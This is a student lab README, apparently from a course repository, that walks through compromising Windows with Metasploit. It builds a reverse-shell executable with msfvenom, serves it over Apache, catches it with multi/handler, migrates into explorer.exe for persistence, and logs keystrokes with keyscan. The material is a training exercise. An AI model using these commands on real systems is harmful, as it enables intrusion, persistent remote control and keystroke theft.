# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

### PROGRAM:
Find the attackers ip address using ifconfig
#### OUTPUT:
![image](https://github.com/user-attachments/assets/9f114080-577e-4c4d-89a5-c8e1aee90f9b)


Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
#### OUTPUT
![image](https://github.com/user-attachments/assets/a0433240-4454-4e40-9bea-151b21c11e14)


copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/user-attachments/assets/4568276e-b714-4120-8f87-bc8a8e5af006)


Start apache server
sudo systemctl apache2 start

![image](https://github.com/user-attachments/assets/2bec5ee3-c7da-46dd-850d-78b9b1a2b5f8)



Check the status of apache2

![image](https://github.com/user-attachments/assets/ec9a2d75-8aa7-4d07-9398-cfc1d257eb33)


Invoke msfconsole:
## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
![image](https://github.com/user-attachments/assets/95bcd6da-385e-433e-a4f5-e35cdd9101fc)


Starting a command and control Server
use multi/handler
![image](https://github.com/user-attachments/assets/f0ff5564-496c-450a-8808-2db975e874a4)


set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads.
![6 7](https://github.com/user-attachments/assets/76927041-303e-4d38-a66e-8bd6e89d6563)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/user-attachments/assets/049996e8-1ca7-41cb-a270-e2df3b357376)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
![image](https://github.com/user-attachments/assets/07d9f86d-ca95-427a-b005-9e6969354176)



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
![6 10](https://github.com/user-attachments/assets/66442dd7-aedd-4c09-8d4c-4100ae0ac911)

A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![migrate-Nexplorer](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/836e6efa-423f-4553-ad2f-19170b010892)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/user-attachments/assets/f5776fc3-80cb-4ae1-8ba0-f8bf1cd4771a)
![6 14](https://github.com/user-attachments/assets/781f8912-c6e5-4a38-9f49-da7c39338628)


keyscan_dump	Shows the keystrokes captured so far
![image](https://github.com/user-attachments/assets/1ca75d17-301e-4c88-9082-6bfcfab05318)







## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
